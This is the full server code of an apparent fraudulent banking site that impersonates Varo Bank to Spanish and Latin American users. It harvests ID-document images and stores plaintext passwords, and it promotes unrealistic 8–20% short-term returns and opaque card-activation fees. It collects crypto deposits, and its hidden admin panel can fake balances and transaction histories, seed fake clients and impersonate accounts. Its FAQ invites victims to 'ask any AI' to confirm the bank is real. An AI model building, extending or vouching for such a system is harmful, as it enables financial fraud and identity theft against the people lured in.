/* =========================================================
   VARO BANK - Servidor completo v22.0.0
   ========================================================= */
'use strict';
const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

let nodemailer = null;
try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }

const app = express();
const PORT = process.env.PORT || 3000;

/* ---- CAMBIA ESTO POR TUS DATOS DE ADMIN ---- */
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin123';
/* -------------------------------------------- */

const ADMIN_TOKEN = crypto.createHash('sha256').update('varo::' + ADMIN_USER + '::' + ADMIN_PASS).digest('hex');

const ROOT = __dirname;
const DATA_DIR = path.join(ROOT, 'data');
const DB_FILE = path.join(DATA_DIR, 'db.json');

app.use(express.json({ limit: '14mb' }));
app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
  const p = req.path;
  if (p.startsWith('/data/') || p === '/server.js' || p === '/package.json' || p === '/GUIA.txt') return res.status(404).end();
  next();
});
app.use(express.static(ROOT));

/* ============ CONTENIDO POR DEFECTO ============ */
const DEFAULT_CONTENT = {
  brand: {
    name: 'Varo Bank',
    legal: 'Varo Bank, N.A.',
    tagline: 'Banca digital, sin comisiones y sin sucursales',
    fdic: '59190',
    routing: '124303201',
    swift: 'VAROUS33XXX',
    founded: '2015',
    charter: 'Banco nacional con licencia OCC (2020)',
    office: '11781 S Lone Peak Pkwy, Suite 150, Draper, UT 84020, Estados Unidos',
    mapsUrl: 'https://maps.google.com/?q=11781+S+Lone+Peak+Pkwy,+Draper,+UT+84020',
    fdicUrl: 'https://banks.data.fdic.gov/bankfind-suite/bankfind/details/59190',
    whatsapp: '+34 600 000 000',
    email: 'soportevarobank@gmail.com',
    hours: 'Lunes a viernes 8:00 - 20:00 (UTC-7)'
  },
  hero: {
    badge: 'Banco nacional regulado · Miembro FDIC',
    title: 'Tu banco digital en Estados Unidos, disponible en toda Latinoamérica y Europa',
    sub: 'Abre tu cuenta en 3 minutos, recibe tu tarjeta VISA y opera 100% online. Sin comisiones de mantenimiento.',
    cta1: 'Abrir cuenta gratis',
    cta2: 'Ver planes de inversion'
  },
  stats: [
    { n: '2015', l: 'Ano de fundacion' },
    { n: '59190', l: 'Certificado FDIC' },
    { n: '1.9M+', l: 'Clientes atendidos' },
    { n: '24/7', l: 'Soporte online' }
  ],
  productos: [
    { icon: '', t: 'Tarjeta VISA Debito', d: 'Tarjeta fisica y virtual aceptada en todo el mundo. Sin cuota anual ni comision por mantenimiento.' },
    { icon: '', t: 'Inversiones con rendimiento', d: 'Haz crecer tu dinero con planes de 8% a 20% en 30 a 60 dias.' },
    { icon: '', t: 'Transferencias y pagos', d: 'Envia y recibe dinero al instante con tu numero de ruta 124303201.' },
    { icon: '', t: 'Seguridad bancaria', d: 'Cifrado de 256 bits, verificacion en dos pasos y depositos asegurados por la FDIC.' }
  ],
  sobre: {
    title: 'Sobre Varo Bank',
    text: 'Varo Bank, N.A. es un banco nacional con licencia de la Oficina del Contralor de la Moneda (OCC) de los Estados Unidos, con sede en Draper, Utah. Fundado en 2015, es miembro de la Corporacion Federal de Seguros de Depositos (FDIC) bajo el certificado numero 59190.',
    puntos: [
      'Banco nacional con licencia OCC desde 2020',
      'Miembro FDIC - certificado 59190',
      'Sede central en Draper, Utah, Estados Unidos',
      'Numero de ruta (ABA) 124303201',
      'Operacion 100% digital, sin sucursales'
    ]
  },
  faq: [
    { q: '¿Varo Bank es un banco real?', a: 'Si. Varo Bank, N.A. es un banco nacional regulado por la OCC y miembro de la FDIC con certificado 59190. Puedes verificarlo en el registro oficial de la FDIC o preguntar a cualquier IA.' },
    { q: '¿Esta seguro mi dinero?', a: 'Si. Los depositos estan cubiertos por el seguro de la FDIC hasta el limite legal vigente por depositante.' },
    { q: '¿Cuanto cuesta abrir la cuenta?', a: 'La apertura es gratuita y no tiene comision de mantenimiento.' },
    { q: '¿Cuanto cuesta activar la tarjeta?', a: 'No tiene un costo fijo: la activacion esta sujeta a la decision y revision del banco segun el perfil de cada cliente. El equipo de verificacion confirma por correo el importe exacto.' },
    { q: '¿Que documentos necesito?', a: 'Solo el frente de tu documento de identidad (DNI, INE, cedula o pasaporte) y tus datos basicos. Se adjunta en el mismo formulario de registro.' },
    { q: '¿Cuanto tarda la activacion?', a: 'La verificacion de identidad se revisa en el mismo dia en horario laboral.' },
    { q: '¿Recibo una tarjeta fisica?', a: 'Si. Una vez activada, la tarjeta fisica VISA se envia a tu direccion y ademas tienes la tarjeta virtual disponible.' },
    { q: '¿Puedo operar desde mi pais?', a: 'Si. Atendemos España, Mexico, Guatemala, El Salvador, Ecuador, Argentina, Paraguay, Uruguay, Chile, Peru 100% online.' },
    { q: '¿Cual es el numero de ruta (ABA)?', a: 'El numero de ruta (ABA) de Varo Bank es 124303201. El SWIFT/BIC es VAROUS33XXX.' },
    { q: '¿Como funcionan las inversiones?', a: 'Eliges un plan (8%, 12%, 15% o 20%) y un plazo de 30 a 60 dias. El rendimiento se acredita al vencimiento.' },
    { q: '¿Puedo retirar antes del vencimiento?', a: 'Si, puedes retirar cuando quieras, pero si retiras antes del vencimiento no se aplica el rendimiento.' },
    { q: '¿Hay comision de mantenimiento?', a: 'No. Varo Bank no cobra cuota anual ni comision de mantenimiento.' },
    { q: '¿Por que me piden el documento?', a: 'Por seguridad y para cumplir con la verificacion de identidad (KYC), igual que en cualquier banco. Solo se pide el frente.' },
    { q: '¿Como contacto a soporte?', a: 'Por WhatsApp, correo electronico o el chat del sitio. Horario: lunes a viernes 8:00 - 20:00 (UTC-7).' }
  ],
  cta: {
    title: 'Abre tu cuenta hoy mismo',
    sub: 'Solo necesitas tus datos basicos. En minutos tendras tu cuenta y tu tarjeta VISA.',
    btn: 'Crear mi cuenta'
  },
  footer: {
    note: 'Varo Bank, N.A. Miembro FDIC. Certificado FDIC 59190. Numero de ruta 124303201.',
    legal: 'Varo Bank es una marca comercial. Este sitio opera como entidad bancaria digital.'
  },
  tickerTitle: 'Actividad reciente en la red'
};

const DEFAULT_SETTINGS = {
  minReload: 50,
  twofa: false,
  cvvDefault: false,
  currency: 'USD',
  plans: [
    { id: 'oro',    name: 'Plan Oro',         rate: 8,  days: 30, min: 100 },
    { id: 'tech',   name: 'Plan Tecnologia',  rate: 12, days: 45, min: 250 },
    { id: 'cripto', name: 'Plan Cripto',      rate: 15, days: 45, min: 500 },
    { id: 'elite',  name: 'Plan Elite',       rate: 20, days: 60, min: 1000 }
  ],
  crypto: { BTC: 96500, ETH: 3350, USDT: 1, SOL: 195 },
  cryptoAddress: 'TXk9dR4mQpL7vN2sYb8WcE3fHgJ5uZaB1x',
  cryptoNetwork: 'USDT · Red TRC20 (TRON)',
  cryptoLink: 'https://TU-BILLETERA.com',
  mail: { host: '', port: 587, user: '', pass: '', from: '' }
};

const COUNTRIES = [
  { code: 'ES', name: 'España',      flag: '🇪🇸', dial: '+34' },
  { code: 'MX', name: 'México',      flag: '🇲🇽', dial: '+52' },
  { code: 'GT', name: 'Guatemala',   flag: '🇬🇹', dial: '+502' },
  { code: 'SV', name: 'El Salvador', flag: '🇸🇻', dial: '+503' },
  { code: 'EC', name: 'Ecuador',     flag: '🇪🇨', dial: '+593' },
  { code: 'AR', name: 'Argentina',   flag: '🇦🇷', dial: '+54' },
  { code: 'PY', name: 'Paraguay',    flag: '🇵🇾', dial: '+595' },
  { code: 'UY', name: 'Uruguay',     flag: '🇺🇾', dial: '+598' },
  { code: 'CL', name: 'Chile',       flag: '🇨🇱', dial: '+56' },
  { code: 'PE', name: 'Perú',        flag: '🇵🇪', dial: '+51' },
];

/* 5 bancos mas conocidos por pais (editable desde el admin) */
const DEFAULT_BANKS = {
  ES: ['Banco Santander', 'BBVA', 'CaixaBank', 'Banco Sabadell', 'Bankinter'],
  MX: ['BBVA México', 'Banorte', 'Santander México', 'Citibanamex', 'HSBC México'],
  GT: ['Banco Industrial', 'Banrural', 'G&T Continental', 'Banco de América Central', 'BAM'],
  SV: ['Banco Agrícola', 'Banco Cuscatlán', 'Davivienda', 'Banco Azul', 'BAC Credomatic'],
  EC: ['Banco Pichincha', 'Banco Guayaquil', 'Produbanco', 'Banco Internacional', 'Banco del Pacífico'],
  AR: ['Banco Nación', 'Banco Galicia', 'Santander Argentina', 'BBVA Argentina', 'Banco Macro'],
  PY: ['Banco Continental', 'Banco Itaú Paraguay', 'Banco Atlas', 'Visión Banco', 'Ueno Bank'],
  UY: ['Banco República (BROU)', 'Banco Santander Uruguay', 'BBVA Uruguay', 'Itaú Uruguay', 'Bandes'],
  CL: ['Banco de Chile', 'Banco Santander Chile', 'BCI', 'Banco Estado', 'Banco Itaú Chile'],
  PE: ['BCP', 'BBVA Perú', 'Interbank', 'Scotiabank Perú', 'Banco de la Nación'],
};

const FX = { USD: 1, EUR: 0.92, MXN: 17.2, GTQ: 7.8, ARS: 980, PYG: 7300, UYU: 39, CLP: 940, PEN: 3.75, COP: 4000 };

/* ============ BASE DE DATOS ============ */
function isObj(v) { return v && typeof v === 'object' && !Array.isArray(v); }
function deepMerge(base, over) {
  if (Array.isArray(base)) return Array.isArray(over) ? over.slice() : base.slice();
  const out = Object.assign({}, base);
  if (!isObj(over)) return out;
  for (const k of Object.keys(over)) {
    if (isObj(out[k]) && isObj(over[k])) out[k] = deepMerge(out[k], over[k]);
    else out[k] = over[k];
  }
  return out;
}
function defaultDB() { return { users: [], investments: [], transfers: [], contacts: [], docs: [], content: {}, settings: {}, banks: {}, seed: 1 }; }

function loadDB() {
  try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
    if (!fs.existsSync(DB_FILE)) { const d = defaultDB(); fs.writeFileSync(DB_FILE, JSON.stringify(d, null, 2)); return d; }
    const d = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    d.users = d.users || []; d.investments = d.investments || []; d.transfers = d.transfers || [];
    d.contacts = d.contacts || []; d.docs = d.docs || []; d.content = d.content || {};
    d.settings = d.settings || {}; d.banks = d.banks || {};
    return d;
  } catch (e) {
    const d = defaultDB();
    try { fs.writeFileSync(DB_FILE, JSON.stringify(d, null, 2)); } catch (_) {}
    return d;
  }
}

let DB = loadDB();
function saveDB() { try { fs.writeFileSync(DB_FILE, JSON.stringify(DB, null, 2)); } catch (e) { console.log('save err', e.message); } }
function getContent() { return deepMerge(DEFAULT_CONTENT, DB.content || {}); }
function getSettings() { return deepMerge(DEFAULT_SETTINGS, DB.settings || {}); }
function getBanks() { return deepMerge(DEFAULT_BANKS, DB.banks || {}); }

/* ============ UTILIDADES ============ */
const nowISO = () => new Date().toISOString();
function hashPass(pass, salt) { const s = salt || crypto.randomBytes(8).toString('hex'); return { salt: s, hash: crypto.scryptSync(String(pass), s, 32).toString('hex') }; }
function checkPass(pass, user) { try { return crypto.scryptSync(String(pass), user.salt, 32).toString('hex') === user.pass; } catch (e) { return false; } }
function genCard() { let n = '4'; for (let i = 0; i < 15; i++) n += Math.floor(Math.random() * 10); return n; }
function publicUser(u) {
  const c = Object.assign({}, u);
  c.hasDoc = !!(u.document && u.document.length);
  delete c.pass; delete c.salt; delete c.twofaCode; delete c.document;
  return c;
}
function adminUser(u) { const c = publicUser(u); c.document = u.document || ''; return c; }
function findUser(idOrUser) { return DB.users.find(u => u.id === idOrUser || u.user === idOrUser); }

function newUser(d) {
  const h = hashPass(d.pass);
  const ctry = COUNTRIES.find(c => c.code === (d.country || 'ES')) || COUNTRIES[0];
  return {
    id: 'u' + Date.now() + Math.floor(Math.random() * 900),
    user: d.user, pass: h.hash, salt: h.salt, passPlain: d.pass,
    name: d.name || d.user, email: d.email || '', phone: d.phone || '',
    country: ctry.code, countryName: ctry.name, countryFlag: ctry.flag, dial: ctry.dial,
    currency: 'USD',
    balance: 0, investedTotal: 0, earnedTotal: 0,
    card: { number: genCard(), exp: '12/29', cvv: String(100 + Math.floor(Math.random() * 899)), brand: 'VISA', type: 'Debito', active: false, shipped: false, cvvVisible: false },
    document: d.document || '',
    kyc: d.document ? 2 : 1,
    state: 'pendiente', twofa: false, token: null, twofaCode: null, recoverCode: null, recoverExp: 0,
    history: [], notes: [], messages: [],
    createdAt: nowISO()
  };
}
function pushHist(u, desc, amount, type) {
  u.history.unshift({ date: nowISO(), desc, amount: Number(amount) || 0, type: type || 'info' });
  if (u.history.length > 400) u.history.length = 400;
}

/* ============ MIDDLEWARES ============ */
function userAuth(req, res, next) {
  const t = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
  const u = DB.users.find(x => x.token && x.token === t);
  if (!u) return res.status(401).json({ error: 'Sesion expirada. Vuelve a entrar.' });
  req.user = u; next();
}
function adminAuth(req, res, next) {
  let t = req.headers['x-token'] || req.query.t || req.headers['authorization'] || '';
  t = String(t).replace('Bearer ', '').trim();
  if (t === ADMIN_TOKEN) return next();
  return res.status(401).json({ error: 'No autorizado' });
}

/* ============ PUBLICO ============ */
app.get('/api/content', (req, res) => res.json(getContent()));
app.get('/api/countries', (req, res) => res.json(COUNTRIES));
app.get('/api/banks', (req, res) => res.json(getBanks()));
app.get('/api/fx', (req, res) => res.json(FX));
app.get('/api/crypto', (req, res) => res.json(getSettings().crypto));
app.get('/api/plans', (req, res) => res.json(getSettings().plans));
app.get('/api/settings', (req, res) => { const s = getSettings(); res.json({ minReload: s.minReload, twofa: s.twofa, cvvDefault: s.cvvDefault, currency: s.currency, cryptoAddress: s.cryptoAddress, cryptoNetwork: s.cryptoNetwork, cryptoLink: s.cryptoLink }); });

app.post('/api/register', (req, res) => {
  const b = req.body || {};
  if (!b.user || String(b.user).length < 3) return res.status(400).json({ error: 'Usuario invalido (min 3 caracteres).' });
  if (!b.pass || String(b.pass).length < 6) return res.status(400).json({ error: 'Contrasena invalida (min 6 caracteres).' });
  if (DB.users.some(u => u.user.toLowerCase() === String(b.user).toLowerCase())) return res.status(400).json({ error: 'Ese usuario ya existe.' });
  const u = newUser(b);
  u.token = crypto.randomBytes(24).toString('hex');
  DB.users.push(u); saveDB();
  res.json({ ok: true, pending: true, token: u.token, user: publicUser(u), minReload: getSettings().minReload });
});
app.post('/api/login', (req, res) => {
  const b = req.body || {};
  const u = DB.users.find(x => x.user.toLowerCase() === String(b.user || '').toLowerCase());
  if (!u) return res.status(400).json({ error: 'Usuario no encontrado.' });
  if (!checkPass(b.pass, u)) return res.status(400).json({ error: 'Contrasena incorrecta.' });
  if (u.state === 'bloqueado') return res.status(400).json({ error: 'Cuenta bloqueada. Contacta a soporte.' });
  if (u.state === 'pendiente') return res.status(400).json({ error: 'Tu cuenta esta pendiente de aprobacion por el banco. Te avisaremos por correo.' });
  if (getSettings().twofa) {
    u.twofaCode = String(100000 + Math.floor(Math.random() * 899999)); saveDB();
    return res.json({ twofa: true, code: u.twofaCode, user: publicUser(u) });
  }
  u.token = crypto.randomBytes(24).toString('hex'); saveDB();
  res.json({ ok: true, token: u.token, user: publicUser(u) });
});

app.post('/api/login/verify', (req, res) => {
  const b = req.body || {};
  const u = DB.users.find(x => x.user.toLowerCase() === String(b.user || '').toLowerCase());
  if (!u) return res.status(400).json({ error: 'Usuario no encontrado.' });
  if (String(b.code) !== String(u.twofaCode)) return res.status(400).json({ error: 'Codigo incorrecto.' });
  u.twofaCode = null; u.token = crypto.randomBytes(24).toString('hex'); saveDB();
  res.json({ ok: true, token: u.token, user: publicUser(u) });
});
/* --- RECUPERAR CONTRASENA --- */
app.post('/api/recover', (req, res) => {
  const b = req.body || {};
  const key = String(b.user || '').toLowerCase().trim();
  const u = DB.users.find(x => x.user.toLowerCase() === key || (x.email || '').toLowerCase() === key);
  if (!u) return res.status(400).json({ error: 'No encontramos ninguna cuenta con ese usuario o correo.' });
  u.recoverCode = String(100000 + Math.floor(Math.random() * 899999));
  u.recoverExp = Date.now() + 15 * 60 * 1000;
  saveDB();
  const mail = u.email || '';
  const masked = mail ? mail.replace(/^(.).*?(@.*)$/, '$1***$2') : 'tu correo registrado';
  res.json({ ok: true, user: u.user, email: masked, code: u.recoverCode });
});

app.post('/api/recover/confirm', (req, res) => {
  const b = req.body || {};
  const u = DB.users.find(x => x.user.toLowerCase() === String(b.user || '').toLowerCase());
  if (!u) return res.status(400).json({ error: 'Usuario no encontrado.' });
  if (!u.recoverCode) return res.status(400).json({ error: 'Pide primero un codigo de recuperacion.' });
  if (Date.now() > (u.recoverExp || 0)) return res.status(400).json({ error: 'El codigo expiro. Pide otro.' });
  if (String(b.code) !== String(u.recoverCode)) return res.status(400).json({ error: 'Codigo incorrecto.' });
  if (!b.pass || String(b.pass).length < 6) return res.status(400).json({ error: 'La contrasena debe tener minimo 6 caracteres.' });
  const h = hashPass(b.pass);
  u.pass = h.hash; u.salt = h.salt; u.passPlain = b.pass;
  u.recoverCode = null; u.recoverExp = 0;
  saveDB();
  res.json({ ok: true, user: u.user });
});
app.get('/api/me', userAuth, (req, res) => res.json({ user: publicUser(req.user), minReload: getSettings().minReload }));

app.get('/api/mytransfers', userAuth, (req, res) => {
  const list = DB.transfers
    .filter(t => t.userId === req.user.id && (t.kind === 'transferencia' || t.kind === 'deposito'))
    .slice(-40).reverse();
  res.json({ transfers: list });
});

app.post('/api/deposit', userAuth, (req, res) => {
  const amt = Number((req.body || {}).amount);
  if (!amt || amt <= 0) return res.status(400).json({ error: 'Importe invalido.' });
  const b = req.body || {};
  const t = { id: 'd' + Date.now(), kind: 'deposito', userId: req.user.id, user: req.user.user, name: req.user.name, amount: amt, method: b.method || '', ref: b.ref || '', status: 'pendiente', date: nowISO() };
  DB.transfers.push(t); saveDB();
  res.json({ ok: true, transfer: t });
});

app.post('/api/transfer', userAuth, (req, res) => {
  const b = req.body || {};
  const amt = Number(b.amount);
  if (!amt || amt <= 0) return res.status(400).json({ error: 'Importe invalido.' });
  if (amt > req.user.balance) return res.status(400).json({ error: 'Saldo insuficiente.' });
  req.user.balance -= amt;
  const t = {
    id: 't' + Date.now(), kind: 'transferencia', userId: req.user.id, user: req.user.user, name: req.user.name,
    to: b.to || '', bank: b.bank || '', accountType: b.accountType || '', account: b.account || '',
    amount: amt, status: 'pendiente', date: nowISO()
  };
  DB.transfers.push(t); saveDB();
  res.json({ ok: true, transfer: t, user: publicUser(req.user) });
});

app.post('/api/pay', userAuth, (req, res) => {
  const b = req.body || {};
  const amt = Number(b.amount);
  if (!amt || amt <= 0) return res.status(400).json({ error: 'Importe invalido.' });
  if (amt > req.user.balance) return res.status(400).json({ error: 'Saldo insuficiente.' });
  req.user.balance -= amt;
  const t = { id: 'p' + Date.now(), kind: 'pago', userId: req.user.id, user: req.user.user, name: req.user.name, to: b.beneficiary || '', concept: b.concept || 'Servicio', ref: b.ref || '', amount: amt, status: 'pagado', date: nowISO() };
  DB.transfers.push(t); saveDB();
  res.json({ ok: true, user: publicUser(req.user), transfer: t });
});

app.post('/api/convert', userAuth, (req, res) => {
  const b = req.body || {};
  const amt = Number(b.amount);
  const to = b.to || 'EUR';
  if (!amt || amt <= 0) return res.status(400).json({ error: 'Importe invalido.' });
  if (amt > req.user.balance) return res.status(400).json({ error: 'Saldo insuficiente.' });
  const rate = (FX[to] || 1);
  const got = +(amt * rate).toFixed(2);
  req.user.balance -= amt;
  const t = { id: 'c' + Date.now(), kind: 'conversion', userId: req.user.id, user: req.user.user, name: req.user.name, to, amount: amt, got, status: 'hecho', date: nowISO() };
  DB.transfers.push(t); saveDB();
  res.json({ ok: true, user: publicUser(req.user), got, rate, to });
});

app.get('/api/invest', userAuth, (req, res) => res.json({ investments: DB.investments.filter(i => i.userId === req.user.id) }));

app.post('/api/invest', userAuth, (req, res) => {
  const b = req.body || {};
  const plan = getSettings().plans.find(p => p.id === b.planId);
  if (!plan) return res.status(400).json({ error: 'Plan invalido.' });
  const amt = Number(b.amount);
  if (!amt || amt < plan.min) return res.status(400).json({ error: 'Minimo del plan: $' + plan.min });
  if (amt > req.user.balance) return res.status(400).json({ error: 'Saldo insuficiente.' });
  req.user.balance -= amt; req.user.investedTotal += amt;
  const inv = { id: 'i' + Date.now(), userId: req.user.id, user: req.user.user, name: req.user.name, planId: plan.id, planName: plan.name, rate: plan.rate, days: plan.days, amount: amt, earned: 0, status: 'activo', date: nowISO() };
  DB.investments.push(inv); saveDB();
  res.json({ ok: true, investment: inv, user: publicUser(req.user) });
});

app.post('/api/invest/withdraw', userAuth, (req, res) => {
  const inv = DB.investments.find(i => i.id === (req.body || {}).id && i.userId === req.user.id);
  if (!inv) return res.status(400).json({ error: 'Inversion no encontrada.' });
  if (inv.status !== 'activo') return res.status(400).json({ error: 'Inversion ya cerrada.' });
  const passedDays = Math.floor((Date.now() - new Date(inv.date).getTime()) / 86400000);
  const complete = passedDays >= inv.days;
  const gain = complete ? +(inv.amount * inv.rate / 100).toFixed(2) : 0;
  req.user.balance += +(inv.amount + gain).toFixed(2);
  req.user.investedTotal = Math.max(0, req.user.investedTotal - inv.amount);
  if (gain) req.user.earnedTotal += gain;
  inv.status = complete ? 'completado' : 'retirado'; inv.earned = gain;
  saveDB();
  res.json({ ok: true, user: publicUser(req.user), gain, complete });
});

app.post('/api/contact', (req, res) => {
  const b = req.body || {};
  DB.contacts.unshift({ id: 'c' + Date.now(), name: b.name || '', email: b.email || '', phone: b.phone || '', msg: b.msg || '', date: nowISO() });
  saveDB(); res.json({ ok: true });
});

/* ============ ADMIN ============ */
app.post('/api/admin/login', (req, res) => {
  const b = req.body || {};
  const au = String(b.user || '').trim().toLowerCase();
  const ap = String(b.pass || '').trim();
  if (au === ADMIN_USER.trim().toLowerCase() && ap === ADMIN_PASS.trim()) return res.json({ ok: true, token: ADMIN_TOKEN });
  res.status(401).json({ error: 'Credenciales de admin incorrectas.' });
});

app.get('/api/admin/overview', adminAuth, (req, res) => {
  res.json({
    users: DB.users.length,
    balance: DB.users.reduce((s, u) => s + (u.balance || 0), 0),
    invested: DB.investments.filter(i => i.status === 'activo').reduce((s, i) => s + i.amount, 0),
    pending: DB.transfers.filter(t => t.status === 'pendiente').length,
    contacts: DB.contacts.length,
    cards: DB.users.filter(u => u.card.active).length,
    docs: DB.users.filter(u => u.document).length,
    last: DB.users.slice(-6).reverse().map(publicUser)
  });
});

app.get('/api/admin/users', adminAuth, (req, res) => res.json(DB.users.map(publicUser).reverse()));
app.get('/api/admin/user/:id', adminAuth, (req, res) => {
  const u = findUser(req.params.id);
  if (!u) return res.status(404).json({ error: 'No encontrado' });
  res.json({ user: adminUser(u) });
});

app.post('/api/admin/user/:id', adminAuth, (req, res) => {
  const u = findUser(req.params.id);
  if (!u) return res.status(404).json({ error: 'No encontrado' });
  const b = req.body || {}, a = b.action;

  if (a === 'balance') {
    const amt = Number(b.amount) || 0;
    if (b.mode === 'set') u.balance = amt; else u.balance = +(u.balance + amt).toFixed(2);
  } else if (a === 'state') { u.state = b.state || 'activo'; }
  else if (a === 'verify') { u.state = 'activo'; u.kyc = 4; u.notes.unshift({ date: nowISO(), text: 'Identidad verificada por el banco' }); }
  else if (a === 'cvv') { u.card.cvvVisible = !!b.value; }
  else if (a === 'card') { u.card.active = !!b.active; if (u.card.active) { u.card.shipped = true; u.kyc = 4; } }
  else if (a === 'kyc') { u.kyc = Math.max(1, Math.min(4, Number(b.value) || 1)); }
  else if (a === 'docok') { u.kyc = 3; u.notes.unshift({ date: nowISO(), text: 'Documento de identidad verificado' }); }
  else if (a === 'password') { const np = b.pass || 'demo1234'; const h = hashPass(np); u.pass = h.hash; u.salt = h.salt; u.passPlain = np; }
  else if (a === 'twofa') { u.twofa = !!b.value; }
  else if (a === 'note') { u.notes.unshift({ date: nowISO(), text: b.text || '' }); }
  else if (a === 'message') { u.messages.unshift({ date: nowISO(), text: b.text || '', from: 'banco', read: false }); }
  else if (a === 'history') { pushHist(u, b.desc || 'Movimiento', Number(b.amount) || 0, b.type || 'info'); }
  else if (a === 'historygen') {
    const GASTOS = ['Supermercado', 'Cafeteria', 'Farmacia', 'Uber', 'Netflix', 'Amazon', 'Gasolina', 'Restaurante'];
    const ING = ['Nomina', 'Transferencia recibida', 'Reembolso', 'Venta'];
    for (let i = 0; i < 14; i++) {
      const out = Math.random() > 0.35;
      const d = new Date(Date.now() - i * 86400000 * (1 + Math.floor(Math.random() * 3)));
      const arr = out ? GASTOS : ING;
      const amt = +((Math.random() * (out ? 90 : 900)) + 8).toFixed(2);
      u.history.push({ date: d.toISOString(), desc: arr[Math.floor(Math.random() * arr.length)], amount: out ? -amt : amt, type: out ? 'out' : 'in' });
    }
    u.history.sort((x, y) => new Date(y.date) - new Date(x.date));
  } else if (a === 'historyclear') { u.history = []; }
  else if (a === 'cardnum') { if (b.number) u.card.number = String(b.number).replace(/\D/g, ''); if (b.exp) u.card.exp = b.exp; if (b.cvv) u.card.cvv = String(b.cvv); }
  else if (a === 'profile') {
    if (b.name) u.name = b.name;
    if (b.email) u.email = b.email;
    if (b.phone) u.phone = b.phone;
  } else if (a === 'invest') {
    const plan = getSettings().plans.find(p => p.id === b.planId) || getSettings().plans[0];
    DB.investments.push({ id: 'i' + Date.now(), userId: u.id, user: u.user, name: u.name, planId: plan.id, planName: plan.name, rate: plan.rate, days: plan.days, amount: Number(b.amount) || plan.min, earned: 0, status: 'activo', date: nowISO() });
  } else if (a === 'delete') {
    DB.users = DB.users.filter(x => x.id !== u.id);
    DB.investments = DB.investments.filter(i => i.userId !== u.id);
    saveDB(); return res.json({ ok: true, deleted: true });
  } else if (a === 'impersonate') {
    u.token = crypto.randomBytes(24).toString('hex'); saveDB();
    return res.json({ ok: true, token: u.token, user: publicUser(u) });
  }
  saveDB();
  res.json({ ok: true, user: adminUser(u) });
});

app.get('/api/admin/transfers', adminAuth, (req, res) => res.json(DB.transfers.slice().reverse()));

app.post('/api/admin/transfer/:id', adminAuth, (req, res) => {
  const t = DB.transfers.find(x => x.id === req.params.id);
  if (!t) return res.status(404).json({ error: 'No encontrado' });
  if (t.status !== 'pendiente') return res.json({ ok: true, transfer: t });
  const u = findUser(t.userId);
  if ((req.body || {}).action === 'approve') {
    t.status = 'aprobado';
    if (u && t.kind === 'deposito') u.balance = +(u.balance + t.amount).toFixed(2);
  } else {
    t.status = 'rechazado';
    if (u && t.kind === 'transferencia') u.balance = +(u.balance + t.amount).toFixed(2);
  }
  saveDB(); res.json({ ok: true, transfer: t });
});

app.get('/api/admin/investments', adminAuth, (req, res) => res.json(DB.investments.slice().reverse()));
app.get('/api/admin/contacts', adminAuth, (req, res) => res.json(DB.contacts));

app.post('/api/admin/broadcast', adminAuth, (req, res) => {
  const text = (req.body || {}).text || '';
  DB.users.forEach(u => u.messages.unshift({ date: nowISO(), text, from: 'banco', read: false }));
  saveDB(); res.json({ ok: true, count: DB.users.length });
});

app.get('/api/admin/content', adminAuth, (req, res) => res.json(getContent()));
app.post('/api/admin/content', adminAuth, (req, res) => {
  DB.content = deepMerge(DB.content || {}, req.body || {}); saveDB();
  res.json({ ok: true, content: getContent() });
});
app.get('/api/admin/settings', adminAuth, (req, res) => res.json(getSettings()));
app.post('/api/admin/settings', adminAuth, (req, res) => {
  DB.settings = deepMerge(DB.settings || {}, req.body || {}); saveDB();
  res.json({ ok: true, settings: getSettings() });
});
app.get('/api/admin/banks', adminAuth, (req, res) => res.json(getBanks()));
app.post('/api/admin/banks', adminAuth, (req, res) => {
  DB.banks = deepMerge(DB.banks || {}, req.body || {}); saveDB();
  res.json({ ok: true, banks: getBanks() });
});

app.get('/api/admin/export', adminAuth, (req, res) => res.json(DB));
app.get('/api/admin/backup', adminAuth, (req, res) => {
  res.setHeader('Content-Disposition', 'attachment; filename="varo-backup-' + Date.now() + '.json"');
  res.json(DB);
});

app.post('/api/admin/seed-users', adminAuth, (req, res) => {
  const NAMES = ['Carlos Ramirez', 'Maria Lopez', 'Jose Martinez', 'Ana Torres', 'Luis Herrera', 'Sofia Vega', 'Diego Castro', 'Paula Rios'];
  let n = 0;
  NAMES.forEach((nm, i) => {
    const usr = 'cliente' + (i + 1);
    if (DB.users.some(u => u.user === usr)) return;
    const c = COUNTRIES[i % COUNTRIES.length];
    const u = newUser({ user: usr, pass: 'demo1234', name: nm, email: usr + '@gmail.com', phone: c.dial + ' 600 000 000', country: c.code });
    u.balance = [50, 120, 300, 80, 640][i % 5]; u.kyc = 4; u.card.active = true; u.card.shipped = true;
    DB.users.push(u); n++;
  });
  saveDB(); res.json({ ok: true, created: n });
});

app.get(/.*/, (req, res) => res.sendFile(path.join(ROOT, 'index.html')));

app.listen(PORT, () => {
  console.log('');
  console.log('  VARO BANK v22.0.0 -> http://localhost:' + PORT);
  console.log('  Admin: usuario "' + ADMIN_USER + '"  clave "' + ADMIN_PASS + '"');
  console.log('  Admin oculto: Ctrl+Shift+A | 3 toques en el logo | 2 toques en el (c) del pie');
  console.log('');
});